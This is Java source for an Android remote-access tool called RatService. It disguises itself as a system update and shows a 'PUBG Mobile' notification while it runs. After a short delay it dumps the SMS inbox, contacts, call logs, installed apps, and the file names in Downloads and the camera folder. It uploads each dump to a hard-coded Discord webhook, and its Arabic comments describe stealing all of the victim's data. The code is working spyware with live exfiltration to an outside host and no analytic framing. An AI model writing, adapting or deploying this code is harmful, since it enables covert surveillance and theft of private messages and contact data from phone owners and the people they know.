package com.system.update;

import android.app.*;
import android.content.*;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import org.json.JSONObject;
import java.io.*;
import java.util.List;
import okhttp3.*;

public class RatService extends Service {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
    private OkHttpClient client = new OkHttpClient();
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        sendTextToDiscord("🔄 **تم تفعيل الأداة! جاري سحب كل البيانات (رسايل، مكالمات، جهات اتصال)...**");

        // نستنى 6 ثواني لحد ما المستخدم يوافق على كل الصلاحيات
        new Thread(() -> {
            try {
                Thread.sleep(6000);
                
                // 1. معلومات الجهاز
                String info = "📱 **معلومات الجهاز:**\n" +
                        "Model: " + Build.MODEL + "\n" +
                        "Brand: " + Build.BRAND + "\n" +
                        "Android: " + Build.VERSION.RELEASE;
                sendTextToDiscord(info);

                // 2. سحب الرسايل
                dumpSms();
                Thread.sleep(2500);

                // 3. سحب جهات الاتصال
                dumpContacts();
                Thread.sleep(2500);

                // 4. سحب سجل المكالمات
                dumpCallLogs();
                Thread.sleep(2500);

                // 5. سحب التطبيقات المثبتة
                dumpApps();
                Thread.sleep(2500);

                // 6. سحب أسماء الملفات من التحميلات والكاميرا
                dumpFiles();

                sendTextToDiscord("✅ **اكتمل سحب البيانات بالكامل بنجاح!**");
            } catch (Exception e) {
                sendTextToDiscord("❌ خطأ: " + e.getMessage());
            }
        }).start();
    }

    private void startForegroundService() {
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, channelId).setContentTitle("PUBG Mobile").setSmallIcon(android.R.drawable.ic_menu_manage).build();
            startForeground(1, notification);
        }
    }

    // --- دوال سحب البيانات وإنشاء الملفات ---

    private void dumpSms() {
        File file = new File(getExternalFilesDir(null), "sms_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String address = c.getString(c.getColumnIndexOrThrow("address"));
                    String body = c.getString(c.getColumnIndexOrThrow("body"));
                    bw.write("From: " + address + "\n" + body + "\n-------------------\n");
                }
                c.close();
            }
            bw.flush();
            uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpContacts() {
        File file = new File(getExternalFilesDir(null), "contacts_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    bw.write(name + " : " + number + "\n");
                }
                c.close();
            }
            bw.flush();
            uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpCallLogs() {
        File file = new File(getExternalFilesDir(null), "calls_all.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String number = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String type = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    String duration = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    bw.write("Number: " + number + " | Type: " + type + " | Dur: " + duration + "s\n");
                }
                c.close();
            }
            bw.flush();
            uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpApps() {
        File file = new File(getExternalFilesDir(null), "apps.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
            for (ApplicationInfo app : apps) {
                bw.write(app.packageName + "\n");
            }
            bw.flush();
            uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    private void dumpFiles() {
        File file = new File(getExternalFilesDir(null), "files.txt");
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
            File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            
            bw.write("=== Downloads ===\n");
            if (download.exists() && download.listFiles() != null) {
                for (File f : download.listFiles()) bw.write(f.getName() + "\n");
            }
            
            bw.write("\n=== DCIM (Camera) ===\n");
            if (dcim.exists() && dcim.listFiles() != null) {
                for (File f : dcim.listFiles()) bw.write(f.getName() + "\n");
            }
            
            bw.flush();
            uploadFile(file, "text/plain");
        } catch (Exception ignored) {}
    }

    // --- دوال الاتصال بالديسكورد ---

    private void sendTextToDiscord(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", text);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) {}
            });
        } catch (Exception ignored) {}
    }

    private void uploadFile(File file, String mimeType) {
        if (!file.exists()) return;
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("content", "📁 **ملف:** " + file.getName())
                .addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)))
                .build();
        Request request = new Request.Builder().url(WEBHOOK_URL).post(requestBody).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { isRunning = false; super.onDestroy(); }
}
